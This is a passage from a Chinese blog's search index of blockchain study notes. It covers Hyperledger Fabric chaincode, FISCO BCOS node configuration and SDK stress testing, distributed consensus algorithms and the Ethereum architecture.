Tolerence）容错（无恶意节点情况下的容错）和持久化，也可以进行扩展。\n激励层超级账本Fabric系统的设计初衷是用于构建联盟链，解决联盟中多组织之间的信任协作问题，区块链网络节点一般是由联盟主管机构或联盟中的多个组织提供和维护，超级账本Fabric系统内部不提供任何加密货币相关的发行和支付功能，因此，超级账本Fabric系统不提供与比特币、以太坊等系统的激励层功能。但是，在互联网环境中可以将超级账本Fabric系统与外部加密货币系统或第三方支付系统结合来实现类似的激励功能。\n合约层在超级账本Fabric系统中，智能合约称为“链码”（Chain Code），链码是一种遵循相关开发和部署规范的执行特定合约业务功能的可运行程序，系统合约层提供了对链码的全生命周期管理，涉及链码从开发到部署运行的整个过程。\nl链码通过区块存储于区块链网络，能够独立运行在所属通道的Peer节点上的Docker容器中，以gRPC协议与相应的Peer节点进行通信，是对区块链系统与分布式账本中的数据进行增、删、改、查等操作的服务接口，可以根据不同的智能合约需求实现不同的复杂应用。\n超级账本Fabric系统的链码分为两类：系统链码和用户链码。\n(1) 系统链码\n​    系统链码一般由超级账本Fabric开源项目社区开发与维护，只能采用Go语言开发，主要提供超级账本Fabric系统级功能，在区块链网络节点启动时会自动完成注册和部署。系统链码主要包括配置管理链码（CSCC）、生命周期管理链码（LSCC）、查询管理链码（QSCC）、交易背书链码（ESCC）和交易验证链码（VSCC）等5类。\n• 配置管理链码（CSCC）：负责处理网络Peer节点端的通道配置，包括加入新的通道和查询给定通道的对应配置等功能。\n• 生命周期管理链码（LSCC）：负责对用户链码的生命周期进行管理，管理在背书节点上的链码部署，主要包括链码的安装、实例化、升级等功能。\n• 查询管理链码（QSCC）：提供账本查询API，如获取区块链、区块、交易等信息。其提供的API接口包括根据交易号查询交易、根据区块号获取区块、根据区块哈希获取区块、根据交易号获取区块和根据通道名称获取最新区块链信息等。\n• 交易背书管理链码（ESCC）：负责背书（签名）过程，并支持对背书策略进行管理。对提交的交易提案的模拟运行结果进行签名，之后创建响应消息返回给客户端。\n• 交易验证链码（VSCC）：负责在记账前提供区块及交易的验证功能。\n(2) 用户链码\n​    用户链码与系统链码定位不同，系统链码实现超级账本Fabric系统的内置功能，而用户链码一般是由基于区块链的应用系统开发人员根据智能合约实际应用场景设计开发的链码，支持使用Go语言、Java语言、JavaScript语言来开发，在基于超级账本区块链的应用系统中具有重要地位和作用，用户链码对外为应用系统提供智能合约服务接口，对内可以对整个区块链系统与账本进行数据读写操作，如果一个应用系统没有通过用户链码与超级账本Fabric系统进行交互，这个应用系统就不是一个真正意义上的基于区块链的应用系统。\n智能合约生命周期管理​    在超级账本Fabric系统中，链码生命周期管理主要涉及用户链码的开发、安装、实例化、运行、升级等阶段，超级账本Fabric系统1.4版本和2.0版本在部分阶段略有不同，如图所示。\n【10】\n• 开发阶段：用户根据智能合约应用需求，使用Go语言、Java语言等设计开发链码程序，在链码程序中使用系统SDK接口操作区块链系统及账本，实现智能合约功能需求，代码开发，形成的Go语言、Java语言等编写的链码文件。\n• 安装阶段：管理员指定链码的名称和版本号，将链码文件打包发送给网络Peer节点（背书节点），节点将链码包以链码名称和版本号的组合形式存储在本地特定的目录下。\n• 实例化阶段：管理员指定通道、链码名称、版本号、背书策略和链码初始化函数，向已安装链码的Peer节点发起实例化请求，Peer节点从本地链码包获取链码文件。根据不同的链码语言，Peer节点使用对应语言的编译器编译链码文件，进而生成可执行文件，并将可执行文件打包生成一个Docker容器镜像，然后使用该镜像创建一个运行对应链码的容器，容器启动后链码与Peer节点之间通过gRPC进行通信。\n• 运行阶段：在运行过程中，链码主要接收并处理客户端发起的交易操作。应用系统或用户通过客户端向Peer节点发起对应链码的调用请求，Peer节点将请求转发给链码。链码执行智能合约逻辑，对区块链系统及账本状态进行增、删、改、查等操作，并将执行结果返回给调用方。\n• 升级阶段：根据智能合约应用需求的变化，链码的功能也随之需要扩展升级，该阶段主要是使用新的链码文件上传到Peer节点，然后生成新的链码镜像和容器。链码在升级过程中，链码名称必须要保持一致，链码版本号必须不同。\n","url":"2024/12/20/链原——Fabric/","date":"2024-12-20"},{"title":"配置管理与测试","content":"Fisco BCOS 配置管理节点配置介绍了节点和账本配置方法，包括端口、证书、日志、群组、共识、存储、交易池、同步、流控等配置项。\nFISCO BCOS支持多账本，每条链包括多个独立账本，账本间数据相互隔离，群组间交易处理相互隔离，每个节点包括一个主配置config.ini和多个账本配置 group.group_id.genesis group.group_id.ini 。\nconfig.ini:主配置文件，主要配置RPC、P2P、SSL证书、账本配置文件路径、兼容性等信息。\ngroup.group_id.genesis ∶群组配置文件，群组内所有节点一致，节点启动后，不可手动更改该配置。主要包括群组共识算法、存储类型、最大gas限制等配置项。\ngroup.group_id.ini:群组可变配置文件，包括交易池大小等，配置后重启节点生效。\n关于配置配置P2P：\n当前版本FISCO BCOS必须在config.ini配置中配置连接节点的P和Port，P2P相关配置包括:\n• listen_ip : P2P监听IP，默认设置为0.e.0.0 。\n• listen_port:节点P2P监听端口。\n• **node, ***︰节点需连接的所有节点 ip:Port或DomainName:Port。该选项支持域名，但建议需\n要使用的用户手动编译源码。\n配置账本文件路径：\n[group]配置本节点所属的所有群组配置路径︰\n• group_data_path:群组数据存储路径。\n• group_config_path:群组配置文件路径。\n配置证书信息：\n基于安全考虑，FISCO BCOS节点间采用SSL加密通信，[network_security]配置SSL连接的证书信息\n• data_path : 证书和私钥文件所在目录。\n• key : 节点私钥相对于data_path 的路径。\n• cert : 证书node.crt相对于data_path的路径。\n• ca_cert : ca证书文件路径。\n• ca_path : ca证书文件夹，多ca时需要。\n配置黑名单列表\ncr1.idx:黑名单节点的Node lD,节点Node ID可通过 node .nodeid文件获取; icx是黑名单节点的索引。\n配置日志信息\n配置节点兼容性\nhttps://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/manual/configuration.html\n组员（群组系统）配置介绍了组员节点的加入和推出方法，包括节点加入&#x2F;退出网络、节点加入&#x2F;推出群组、转化成共识节点、观察者节点及游离节点等操作\n共识配置[consensus]涉及共识相关配置，包括：\n• consensus_type：共识算法类型，目前支持PBFT，Raft和rPBFT，默认使用PBFT共识算法；\n• max_trans_num：一个区块可打包的最大交易数，默认是1000，链初始化后，可通过控制\n台动态调整该参数；\n• consensus_timeout：PBFT共识过程中，每个区块执行的超时时间，默认为3s，单位为秒，\n可通过控制台动态调整该参数；\n• node.idx：共识节点列表，配置了参与共识节点的Node ID，节点的Node ID可通过\n${data_path}&#x2F;node.nodeid文件获取(其中${data_path}可通过主配置config.ini的\n[network_security].data_path配置项获取)\n状态模式配置• state用于存储区块链状态信息，位于genesis文件中[state]：\n• type：state类型，目前支持storage state和MPT state，默认为storage state，storage\nstate将交易执行结果存储在系统表中，效率较高，MPT state将交易执行结果存储在MPT树\n中，效率较低，但包含完整的历史信息。\ngas配置FISCO BCOS兼容以太坊虚拟机(EVM)，为了防止针对EVM的DOS攻击，EVM在执行交易时，引入了gas概念，用来度量智能合约执行过程中消耗的计算和存储资源，包括交易最大gas限制和区块最大gas限制，若交易或区块执行消耗的gas超过限制(gas limit)，则丢弃交易或区块。\nFISCO BCOS是联盟链，简化了gas设计，仅保留交易最大gas限制，区块最大gas通过共识配置的max_trans_num和交易最大gas限制一起约束。FISCO BCOS通过genesis的[tx].gas_limit来配置交易最大gas限制，默认是300000000，链初始化完毕后，可通过控制台指令动态调整gas限制。\nEVM配置FISCO BCOS v2.4.0引入Free Storage Gas衡量模式，提升CPU和内存在Gas消耗中的占比。\nFree Storage Gas模式的开启和关闭通过genesis文件的evm.enable_free_storage配置项控制。\n• evm.enable_free_storage设置为true：开启Free Storage Gas模式\n账本可变配置说明数据库相关配置项\n• scroll_threshold_multiple：当type为Scalable时，此配置项用于配置区块数据库的切换阈\n值，按scroll_threshold_multiple*1000。默认为2，区块数据按每2000块存储在不同的\nRocksDB实例中。\n• db_ip：当type为MySQL时，需要配置该字段，表示MySQL的IP地址。\n• db_port：当type为MySQL时，需要配置该字段，表示MySQL的端口号。\n• db_username：当type为MySQL时，需要配置该字段，表示MySQL的用户名。\n• db_passwd：当type为MySQL时，需要配置该字段，表示MySQL用户对应的密码。\n• db_name：当type为MySQL时，需要配置该字段，表示MySQL中使用的数据库名。\n• init_connections：当type为MySQL时，可选配置该字段，表示与MySQL建立的初始连接数，默认15。使用默认值即可。\n• max_connections：当type为MySQL时，可选配置该字段，表示与MySQL建立的最大连接数，默认20。使用默认值即可。\n交易池配置\nFISCO BCOS将交易池容量配置开放给用户，用户可根据自己的业务规模需求、稳定性需求以\n及节点的硬件配置动态调整交易池配置。\n交易池容量限制\n为防止过多交易堆积在交易池内占用太多内存，FISCO BCOS提供了[tx_pool].limit和\n[tx_pool].memory_limit两个配置项来限制交易池容量：\n• [tx_pool].limit: 限制交易池内可以容纳的最大交易数目，默认为150000，超过该限制后，客户端发到节点的交易会被拒绝。\n• [tx_pool].memory_limit: 交易池内交易占用的内存大小限制，默认为512MB，超过该限制后，客户端发到节点的交易会被拒绝。\n交易池推送线程数配置\n为提升区块链系统性能，FISCO BCOS采用了交易回执异步推送逻辑，当交易上链后，交易池内的推送线程会把交易上链的回执异步推送给客户端，为防止推送线程过多占用较多的系统资源，也为了防止推送线程过少影响交易推送的时效性，FISCO BCOS提供了\n[tx_pool].notify_worker_num配置项来配置异步推送线程数目：\n• [tx_pool].notify_worker_num：异步推送线程数目，默认为2，建议该值不超过8\n组员节点管理FISCO BCOS引入了游离节点、观察者节点和共识节点，这三种节点类型可通过控制台相互转换。\n• 组员\n共识节点：参与共识的节点，拥有群组的所有数据（搭链时默认都生成共识节点）。\n观察者节点：不参与共识，但能实时同步链上数据的节点。\n• 非组员\n游离节点：已启动，待等待加入群组的节点。处在一种暂时的节点状态，不能获取链上的数据。\n配置CA黑白名单介绍了如何通过配置CA黑白名单，实现拒绝与无关的链的节点或指定节点建立连接，或实现仅允许与白名单中的节点建立链接。\n存储加密介绍了设置落盘加密的流程，保证了运行联盟链的数据在硬盘上的安全性\n账户权限控制介绍了基于角色的账户权限控制方法。\n设置SDK白名单介绍了设计节点所服务的SDK证书白名单方法。\nFisco BCOS 测试1.通过Java SDK进行压力测试（以在Ubuntu系统中安装OpenJDK 11为例）\n12345678# 安装open JDK 11$ sudo apt install openjdk-11-jdk# 验证Java版本$ java --version# 输出以下内容：# openjdk 11.0.10 2021-01-19# OpenJDK Runtime Environment (build 11.0.10+9-Ubuntu-0ubuntu1.20.04)# OpenJDK 64-Bit Server VM (build 11.0.10+9-Ubuntu-0ubuntu1.20.04, mixed mode, sharing)\n\n编译源码\n1234567# 下载源码$ git clone https://github.com/FISCO-BCOS/java-sdk-demo$ cd java-sdk-demo# 切换到2.0版本$ git checkout main-2.0# 编译源码$ ./gradlew build\n\n配置Demo\n12345678$ cd dist# 拷贝证书(假设SDK证书位于~/fisco/nodes/127.0.0.1/sdk目录，请根据实际情况更改路径)$ cp -r ~/fisco/nodes/127.0.0.1/sdk/* conf# 拷贝配置文件# 注:# 默认搭建的FISCO BCOS区块链系统Channel端口是20200，若修改了该端口，请同步修改config.toml中的[network.peers]配置选项$ cp conf/config-example.toml conf/config.toml\n\n执行示例压力测试程序\n12345678910# CRUD测试插入1000笔#CRUD合约压测# 压测CRUD insert# count:压测的交易总量#tps:压测QPS# groupId:压测群组java -cp &#x27;conf/: lib/*: apps/*’ org.fisco. bcos. sdk.demo. perf. PerformanceTable[insert] [count][tps)[groupId]示例java -cp &#x27;conf/: lib/*:apps/*’ org.fisco.bcos. sdk. demo. perf.PerformanceTableinsert 1000 100 1\n\n","url":"2025/03/06/配置管理与测试/","date":"2025-03-06"},{"title":"链原——共识机制","content":"区块链共识机制由于各个节点的自身状态和所处网络环境不尽相同，而交易信息的传递又需要时间，并且消息传递本身不可靠，每个节点接收到的需要记录的交易内容和顺序也难以保持一致。因此，区块链系统的共识问题，或者说账本数据一致性问题，是关系着整个区块链系统的正确性和安全性的关键问题。\n共识基本原理与问题数据一致性问题区块链系统的分布式账本中，如何确保分散存储于多个不同网络节点的账本数据在任意时刻都是一致与可信的，不会发生数据冲突与错误，这就涉及分布式系统的一致性问题。\n在分布式系统中，各个节点数据的一致性与节点数据的可信性并不是一个问题，解决系统一致性问题并不一定能保证系统数据的正确可信，区块链共识机制的关键是需要同时解决好一致性与可信性两个问题\nFLP定理FLP定理1：在异步通信的分布式系统中，即使只有一个进程失败，也没有任何算法能保证非故障进程达到一致性。\nFLP定理假设的分布式系统模型如下：\n  (1) 异步通信：异步通信与同步通信的最大区别是没有时钟、不能时间同步、不能使用超时、不能探测失败、消息可任意延迟、消息可乱序；\n  (2) 通信健壮：只要进程非失败，消息虽会被无限延迟，但最终会被送达，且消息仅会被送达一次（无重复）；\n  (3) Fail-Stop模型：进程失败如同宕机，不再处理任何消息，也不会产生错误消息；\n  (4) 失败进程数量：最多只有一个进程失败或单节点宕机。\nFLP定理2：假设在一个分布式系统中，绝大多数进程最初都是正常运行的，且没有进程在运行过程中发生故障，则一定存在一个部分正确的共识协议使所有非故障进程总是能达成一致决议。\n安全性（Safety）与活性（Liveness）两种分布式系统特性：\n  (1)“安全性”是指当分布式系统中即使有节点发生故障时，也不会导致系统产生错误的数据结果。\n  (2)“活性”是指分布式系统中即使有节点发生故障时，系统也可以一直持续运行下去，不会发生系统瘫痪。\nCAP定理CAP定理：一个分布式系统不可能同时满足一致性、可用性、分区容错等三个特性，最多具有一致性、可用性、分区容错这三个特性中的两个。\nCAP定理的名称是其定义中给出的分布式系统的一致性（Consistency）、可用性（Availability）、分区容错（Partition Tolerance）三个特性的英文首字母缩写。\n(1) 一致性\n   在CAP定理中，分布式系统的一致性是指各节点的数据保证一致，即每次从任意节点写入数据后，后续其它节点都能读取到最新的数据。\n  (2) 可用性\n   在CAP定理中，分布式系统的可用性是指每次向非故障的节点发送请求，总能保证收到响应数据。\n  (3) 分区容错\n   在CAP定理中，分布式系统的分区容错是指系统可以容忍不同节点之间消息传递存在延迟或丢失等错误，而不影响系统整体正常运行。\n两军问题原本是用来分析在一个不可靠的通信链路上试图通过通信以达成一致是存在问题的，后来常被用于阐述分布式系统的一致性和共识问题\n拜占庭将军问题拜占庭将军问题描述了如何在存在恶意行为（如消息被篡改）的情况下实现分布式系统的一致性，该问题既是分布式系统领域最复杂的容错模型之一，也是我们理解分布式共识算法和协议的重要基础。\n\n问题求解\n 如果将拜占庭问题中的攻城军队的将军数量对应为分布式系统的节点数量，可以将符合拜占庭问题条件的分布式系统称为“拜占庭系统”，在拜占庭系统中任意两个节点之间的通信是保证可达的，综合上面对最简单的三将军情形分析，可以得出以下结论：\n\n\n对于一个拜占庭系统，如果系统总节点数为Z，表示叛变将军的不可靠节点数为X，只有当Z≥3X＋1时，可由基于拜占庭容错（BFT）类算法的协议保证系统的一致性。\n  在实际的系统中，一般把由于系统故障导致节点不响应的情况归类为“非拜占庭错误（Crash Fault）”，把节点伪造或篡改信息进行恶意响应的情况归类为“拜占庭错误（Byzantine Fault）”。\n非拜占庭容错类共识算法（CFT）​     对于分布式系统，非拜占庭容错类共识算法能在节点发生系统故障或非计划停机等非拜占庭错误时，确保整个分布式系统的可靠性；但是，当系统中存在恶意节点伪造或篡改数据等行为时，非拜占庭容错算法无法保证系统的可靠性。因此，非拜占庭容错类共识算法主要用于实现封闭的、系统节点都受控的企业级分布式系统，如某企业构建的内部分布式应用集群系统或分布式存储系统。非拜占庭容错类共识算法中最有代表性的包括Paxos算法与Raft算法。\nPaxos算法  Paxos算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一，其解决的问题就是在分布式系统中如何就某个值（决议）达成一致。\n前提1：为了保证不出现一些不合法的命令序列，Paxos算法运行的环境必须处在一个可靠的通信网络环境中。即使在异步通信过程中，发送的数据可能会丢失（Lost）、延迟（Delayed）或重复（Duplicated），但不会出现被篡改。\n**前提2:**Paxos算法运行的环境不会出现拜占庭将军问题，即节点群在决定命令序列的过程中不存在恶意节点或受到病毒、黑客的影响的节点。\nPaxos算法的原理\n​    Paxos算法把一个分布式系统中节点划分为3种角色：Proposer（提出提案者）、Acceptor（接受提案者）和Learner（学习决议者）。一个节点可以同时拥有多个角色。\nProposer（提出提案者）：提出提案，提案信息包括提案编号n和提案内容v。常常是分布式系统的发送消息数据的节点担任该角色。\nAcceptor（接受提案者）：收到并审批提案，若提案获得多数Acceptor的接受，则该提案被批准。常常是分布式系统接收消息数据的节点担任该角色，一般需要至少3个且节点个数为奇数，因为Paxos算法最终要产生一个大多数决策者都同意的提案。\nLearner（学习决议者）：被告知提案结果，并与之统一，不参与审批过程，执行被批准的提案中包含的提案内容。\n一个Paxos算法实例的执行包括准备提案（Prepare）和提交提案（Commit）两个阶段，Paxos算法流程如图所示。\n\n  (1) 准备提案阶段\n   Proposer节点收到Acceptor节点的响应，可能存在抢占失败或抢占成功两种情况： \n如果Proposer节点收到超半数以上的Acceptor节点回复的提案编号要大于自己发送的提案编号；则抢占失败。\n如果Proposer节点收到超半数以上Acceptor节点的回复的提案编号等于自己发送的提案编号，则抢占成功；这时Proposer节点就可以进入下一个“提交提案”阶段。\n(2) 提交提案阶段\nProposer节点将抢占的提案编号 n 和提案内容v发送给Acceptor节点。Acceptor节点只批准比自己已经接受提案的编号N大或等于的提案（称为“审批成功”）；并承诺不再接受小于 n 的提案。\nAcceptor节点收到提案后，如果提案的编号大于等于它已经接受的所有提案编号，则Acceptor节点将批准此提案内容并将此批准过的提案回复给Proposer节点。如果提交审批的提案编号小于它已经接受的提案编号，则审批失败，并回复所接受的提案编号。\n如果Proposer节点收到多数派审批失败（此种情况也称为“提案失败”），则将提案编号递增一，重新进入“准备提案阶段”。\n如果Proposer节点收到多数派提案内容相同，则此决议案已经形成。\nPaxos算法的局限性\n​    Paxos算法虽然可以容忍已经申请到访问权的Proposer节点故障，可以容忍少数Acceptor节点故障；但在出现竞争的情况下，其收敛速度很慢，甚至可能出现活锁的情况，例如当有等于或多于Acceptor节点数量的Proposer节点同时发送提案请求后，很难有一个Proposer节点收到半数以上的回复而不断地执行第一阶段的协议。\nRaft算法Raft算法名字来源于可靠（Reliable）、可复制（Replicated）、可冗余（Redundant）与可容错（Fault-Tolerant）。\n​    Raft算法要解决核心问题仍然是在没有拜占庭错误下的分布式系统的共识问题，即在系统节点不会做恶，传递的消息也不会被篡改的前提下如何保证每个节点在执行相同的命令序列。\n前提1：原来的Leader节点发生故障失效后，必须选出一个新的Leader节点，日志复制的顺序也是确定的，必须从Leader节点流向Follower节点。\n前提2：日志复制只允许Leader节点从客户端接收日志，并复制到整个分布式系统的节点中。\n前提3：与Paxos算法一样，Raft算法运行的环境不会出现拜占庭将军问题，即节点群在决定命令序列的过程中不存在恶意节点或受到病毒、黑客的影响的节点。\nRaft算法的原理\n​    Raft算法中，分布式系统的各节点通过心跳（Heartbeat）消息来保持通信，一个节点可以是以下三种角色中的一种：\nLeader（领导者）：Leader节点也称为“主节点”，用于对所有用户的请求进行处理。Leader 节点将带领分布式系统中的所有节点对数据更改达成一致，这个过程被称为日志同步。\nFollower（跟随者）：Follower节点也称为“从节点”，不会主动发送消息，只响应来自Leader节点与Candidate节点的请求。最开始时，所有的节点都是Follower节点，如果Follower节点收不到Leader节点的心跳消息，那么Follower节点会变为Candidate节点。\nCandidate（候选人）：Candidate节点是准备竞选Leader的节点。Candidate节点会向其他节点发起投票（包括投给自己的一票），如果一个Candidate节点收到了半数以上的选票，那么它就当选为新的Leader节点。\nRaft算法为了清晰易懂，将分布式系统一致性共识问题分解为选举主节点（Leader Election）、日志复制（Log Replication）、安全性（Safety）、成员变更（Membership Changes）等几个子问题，每个子问题都可以独立求解，因此理解 Raft 算法只需要相对独立地弄清几个子问题即可。\nRaft算法的局限性\nRaft算法有一个很强的前提就是Leader节点和Follower节点都必须按顺序投票。例如一个基于Raft算法的分布式数据库系统中，必须按照以下顺序处理事务：\n  (1)主库节点按事务顺序发送事务日志；\n  (2)备库节点按事务顺序持久化事务，并应答主库节点；\n  (3)主库节点按事务顺序提交事务。\n   如果不严格按照上述顺序，Raft算法的正确性无法得到保证。但是，对于高峰期每秒钟处理成千上万的事务的分布式数据库，可能会造成无法忽视的潜在性能和稳定性风险。此外，Raft算法的顺序投票策略也会对数据库的多表事务、故障恢复产生影响。\n拜占庭容错类共识算法（BFT）拜占庭容错类共识算法能允许分布式系统节点发生任何类型的错误但错误节点数量不超过一定比例时，确保整个分布式系统的可靠性。简单的说，只要分布式系统的故障（由于非拜占庭错误或拜占庭错误导致）节点数与系统总节点数相比，小于一定比例，拜占庭容错类共识算法就能保证分布式系统的可靠性。由于像比特币、以太坊等区块链系统中，存在大量彼此不信任的网络节点，不排除有恶意节点企图伪造或篡改系统数据，因此，拜占庭容错类共识算法是区块链共识机制主要采用的共识算法。拜占庭容错类共识算法中最有代表性的包括PBFT实用拜占庭容错算法、PoW工作量证明算法、PoS权益证明算法等。\nPBFT实用拜占庭容错算法PBFT（Practical Byzantine Fault Tolerance）算法中文译为实用拜占庭容错算法，简称PBFT算法。\n解决了原始拜占庭容错算法效率不高的问题，将算法复杂度由指数级降低到多项式级，使得在实际系统中解决拜占庭错误（Byzantine Failure）变得可行。\nPBFT算法的原理\nPoW工作量证明算法PoS权益证明算法DPoS委托权益证明算法DPoS算法的目的是为了解决PoW算法的性能与巨大算力资源消耗问题以及PoS算法后期可能出现的少数节点持有大量权益带来的中心化风险问题****。在DPoS算法中，保留了PoS算法的权益机制，借鉴了类似于股份制企业中董事会投票机制的方式，节点用持有的股份投票选出少量称为见证人的节点，这些见证人节点会代理其余节点完成区块的生成和验证。通过减少对确认数量的要求，DPoS算法大大提高了交易的性能。\nDPoS算法的原理\nDPoS共识算法引入了一种类似民主代表大会的机制，系统中所有拥有权益的普通节点投票选举出代表自身权益的见证人节点来实际运营网络，见证人节点提供专业运行的网络服务器来保证区块链网络的安全和性能。\n前提1：见证人节点必须代表普通节点行使区块链出块权利，如果见证人节点不称职，随时都可能被投票出局。\n前提2：见证人节点的数量是固定的，一般是奇数，取决于区块链系统的设计，如在EOS系统中有21个，Bitshares系统中有101个。\nDPoS算法中，区块链系统的节点被划分为普通节点、见证人节点两大类角色。\n   (1) 普通节点\n​    普通节点又称为“权益相关者”节点，是系统中占比最大的节点类型，具有投票权和被选举权，普通节点持有的权益（如货币量、币龄）越多，投票的权重就越高。\n   (2) 见证人节点\n   见证人节点是被普通节点选举出来，代表广大普通节点为区块链添加新区块，执行记帐权利的节点。见证人节点一般会保持中立，维护区块链系统分布式帐本的安全，因为见证人节点始终处于普通节点（利益相关者）的选举控制之下，当见证人节点因不良行为（未记帐或签署无效区块等）时，会造成普通节点的权益损失，因此，普通节点可随时将其选票重新分配给其他见证人节点。\n见证人节点需要具体负责：\n\n确保节点的正常运行；\n\n收集区块链网络里的交易信息，验证交易，把交易打包到区块；\n\n向所有见证人节点广播新区块，其它见证人节点验证后把区块添加到本地账本数据库中；\n\n组织领导并促进区块链项目的发展，对区块链网络发展做出积极的贡献（如贡献代码、筹集资金、建立社群等）来不断提高声誉。\n\n\nDPoS算法参考流程如下：\n  (1) 新节点加入系统作为普通节点运行；\n  (2) 系统各节点投票选出固定数量的见证人节点；\n  (3) 系统对见证人节点进行排序；\n  (4) 见证人节点按照排序，根据系统规定的时间间隔（如EOS系统为0.5秒）轮流生成新区块，如果见证人节点没有成功生成区块，则跳过该见证人节点，由下一见证人节点继续生成区块；\n  (5) 根据见证人节点的排序，新生成的区块交由后续的见证人节点进行区块验证，一个新区块得到超过2&#x2F;3个见证人节点的验证确认后，才能被正式加入到区块链中。\nDPoS算法的局限性\n (1) DPoS算法中选举少数见证人节点代表其它节点生产区块，系统长期运行下去，可能导致少数见证人节点获得的权益激励积累远远多于其它节点，当见证人节点拥有的权益过多时，就拥有了控制见证节点选举的能力，进而破坏选举的民主性。\n (2) DPoS算法中被选举出来的见证人节点可能是恶意节点，当恶意节点不能成功生成区块时，DPoS算法只是选择跳过该节点由下一节点继续生产区块，并且只寄希望于在后续通过投票的方式将其从见证人节点集合中淘汰。缺乏对恶意节点的惩罚措施，该节点仍然可以参与后续的共识过程和见证人节点竞选，继续影响着区块链系统的安全性。\n","url":"2024/12/20/链原——共识机制/","date":"2024-12-20"},{"title":"链原——以太坊系统","content":"以太坊系统以太坊区块链系统架构以太坊区块链系统依然是P2P体系结构，即对等网络结构\n以太坊系统每个节点都可以存储完整的区块链与账本数据，每个节点都可以发起和监听以太坊网络上的交易信息，验证每个交易和区块的合法性；\n每个节点都可以交易的形式发布智能合约，智能合约将存储于区块链中，加载到每个节点上的以太坊虚拟机EVM中执行\n虽然每个以太坊系统节点上都安装了对等的以太坊系统软件，但是每个节点可以自由选择启动以太坊系统的不同功能，从而属于不同的节点类型，在区块链网络中扮演不同的角色。目前，以太坊系统的节点总体上可以分为“全节点”、“轻节点”、“存档节点”等类型，其中发挥核心作用的是全节点。\n【1】\n系统逻辑架构【2】\n以太坊系统的存储层主要采用文件系统和LevelDB Key-Value数据库，为以太坊系统相关的区块链、分布式账本、智能合约、X.509数字证书、日志、配置文件等数据提供高效、可靠持久化存储服务。\n以太坊系统的数据层是系统核心功能层级之一，对以太坊系统核心的区块、区块链、交易、账本、账户、地址、状态树、交易树、收据树等关键数据结构进行定义和处理，负责将交易打包进区块，由区块组成区块链，并构建了状态树、交易树、收据树等数据结构。同时以太坊系统采用了传统的账户&#x2F;余额模型构建账本数据，更加易于理解，并基于底层的存储服务提供对以太坊区块链数据的安全读写访问管理。\n以太坊系统的网络层是系统核心功能层级之一，主要采用结构化P2P网络，基于Kademlia分布式哈希表协议，实现网络节点快速发现与连接，以及区块、交易数据的分发与同步，为以太坊系统各网络节点之间提供节点发现与安全连接通信机制，为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制。\n以太坊系统的共识层是系统核心功能层级之一，系统前期版本采用与比特币系统类似的PoW工作量证明共识机制，但是对PoW共识算法进行了改进优化，没有采用比特币系统单纯依赖算力的双SHA-256哈希计算，而是使用了同时依赖于算力和内存容量的ETHash算法，系统后期版本计划支持算力无关的PoS权益证明共识机制。\n以太坊系统的激励层在共识层的功能基础上，采用无总量限制的以太币发行机制，与比特币系统的激励机制不同，除了出块激励外，还增加了叔块激励和交易服务费等激励机制。\n以太坊系统的合约层首次定义并提供了强大的智能合约功能，智能合约可以基于Solidity等多种图灵完备的编程语言开发实现，并提供了专用的以太坊虚拟机EVM作为智能合约的安全隔离运行环境。\n以太坊系统的接口层提供了基于JSON RPC、Web3.js的SDK接口和命令行接口。\n   以太坊系统的应用层基于接口层提供的SDK接口，可以基于以太坊区块链实现面向多种应用场景和业务逻辑的公有链或DApp去中心化应用。\n以太坊系统数据层区块与区块链以太坊区块的区块体除了包含交易列表外，还包含一个特殊的叔区块（Uncle Block）头部分。\n【4】\n【3】\n账本数据\n以太坊的分布式账本采用了传统记账系统的账户模型，即每个用户对应一个直接记录余额的账户，交易中附带有参与交易的账户的信息。以太坊用账户来记录系统状态，包括每个账户存储余额信息、智能合约代码和内部数据存储等。\n\n相比于比特币的UTXO模型，以太坊所采用的传统账户&#x2F;余额模型显然更易于理解和进行智能合约的编程。\n\n以太坊的每一个账户都由公钥密码机制生成的一对公私钥进行定义，账户地址是采用一种SHA-3（Keccak-256）哈希算法对公钥数据进行哈希计算的32字节结果的后20字节数据的40位十六进制字符表示。\n【5】\n\n\n以太坊系统有两类账户：\n  (1) 外部账户EOA（Externally Owned Account）**\n​    外部账户是给以太币拥有者分配的账户，拥有该账户的用户可以通过账户对应的私钥创建和签署交易，发送消息至其他外部账户或合约账户。\n  (2) 合约账户COA（Contract Account）\n​    合约账户是一种特殊用途的账户，用于存储执行的智能合约代码，只能被外部账户触发从而执行其对应的合约代码，从而执行各种预先定义好的操作。\n交易数据状态数据  在以太坊系统中，所有账户（外部账户与合约账户）的状态共同构成了以太坊系统的状态。以太坊系统用一棵采用默克尔帕特里夏MPT树型数据结构定义的“全局状态树”来保存每个区块产生时系统的状态，并在当时的区块中保存了状态树的根哈希。\n\n状态树中的每个叶子节点都表示一个账户状态，当新区块被产生时，状态树的根哈希值将被写入区块中，期间只会有小部分的账户状态会发生改变，状态树中只有部分节点状态会改变。\n\n为了节省存储空间，并不是每个区块都独立构建一棵状态树，而是共享状态树的节点数据，针对发生改变的节点状态，会新建一些分支，而不是更新原节点的状态数据，历史状态数据都将被保留。\n\n\n以太坊系统网络层P2P网络结构与节点以太坊系统网络层位于数据层之上、共识层之下，是系统的核心功能层次之一，主要提供以下网络管理功能：\n  (1) 区块链P2P网络的组网管理\n  (2) 各网络节点的节点发现、连接与通信管理\n  (3) 新区块或交易数据广播管理\n  (4) 各网络节点之间区块链数据同步管理\n(1)全节点\n​    以太坊系统的网络全节点需要保存全链数据，全节点所需的储存空间也在不断增长。\n​    以太坊系统网络全节点的主要工作包括：\n​    • 将系统所有区块链与状态数据存储在节点本地，建立全链数据副本，可以根据请求为网络提供任何公开数据。\n​    • 接收并验证新区块数据，若新区块通过验证，就保存在本地的区块链中，并向其它邻近节点广播区块数据。\n​    • 接收并验证其他帐户或去中心化应用DApp发出的交易数据，若新交易通过验证，就保存在本地的交易池中，并向其它邻近节点广播交易数据。\n   • 通过求解指定的PoW工作量证明计算难题来竞争新区块的出块权，从而获得以太币激励，并把多条交易记录打包写入新区块。\n   • 对存储在区块链中的智能合约进行部署与执行。\n（2) 轻节点\n​    以太坊系统网络轻节点不需储存和维护完整的区块链数据副本，只存储所有的区块头数据，可以通过检验区块头中包含的状态树根哈希，并按需向全节点请求相关区块链信息，从而验证数据的有效性。轻节点一般用于发送或传递交易信息，对节点的CPU计算性能、内存容量、磁盘容量、运行稳定性都要求较低。\n(3) 存档节点\n​    